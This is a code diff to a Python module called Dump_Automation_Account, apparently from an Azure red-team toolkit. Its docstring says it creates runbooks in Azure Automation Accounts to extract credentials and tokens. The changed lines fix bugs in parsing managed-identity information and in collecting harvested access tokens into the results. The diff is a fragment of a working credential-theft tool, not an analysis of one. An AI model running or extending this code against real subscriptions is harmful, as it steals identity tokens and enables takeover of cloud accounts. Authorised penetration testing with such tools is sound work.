@@ -1,3 +1,7 @@
+'''
+Module Name : Dump_Automation_Account
+Module Description : Create multiple runbooks within Azure Automation Accounts to execute scripts that extract credentials and tokens. 
+'''
 from azure.identity import DefaultAzureCredential
 from azure.mgmt.automation import AutomationClient
 from azure.mgmt.resource import ResourceManagementClient
@@ -207,7 +211,7 @@ def TechniqueMain(subscription_id):
 
             for identity_type in identity_types:
                 if identity_type == 'UserAssigned':
-                    user_assigned_clients = [{'PrincipalId': v['PrincipalId'], 'ClientId': v['ClientId']} for v in identity_info.get('userAssignedIdentities', {}).values()]
+                    user_assigned_clients = [{'PrincipalId': v['principalId'], 'ClientId': v['clientId']} for v in identity_info.get('userAssignedIdentities', {}).values()]
                 if identity_type == 'SystemAssigned':
                     system_assigned_principal_id = identity_info.get('principalId')
 
@@ -223,12 +227,12 @@ def TechniqueMain(subscription_id):
                             for token in token_json:
                                 auto_account_data[auto_account_name]["tokens"]["UserAssigned" if token["PrincipalId"] != system_assigned_principal_id else "SystemAssigned"].append({
                                     "object_id": token["PrincipalId"],
-                                    "token_value": f"{token["Token"]}"
+                                    "token_value": f"{token['Token']}"
                                 })
                         elif isinstance(token_json, dict):
                             auto_account_data[auto_account_name]["tokens"]["UserAssigned" if token_json["PrincipalId"] != system_assigned_principal_id else "SystemAssigned"].append({
                                 "object_id": token_json["PrincipalId"],
-                                "token_value": f"{token_json["Token"]}"
+                                "token_value": f"{token_json['Token']}"
                             })
                         else:
                             print(f"Unexpected JSON format: {token_json}")
@@ -262,8 +266,8 @@ def TechniqueMain(subscription_id):
                 except Exception:
                     pass
         
-    pretty_response = {}                
-    pretty_response["Success"] = auto_account_data
+    pretty_response = {}
+    pretty_response = auto_account_data
     
     return True, raw_responses, pretty_response
 
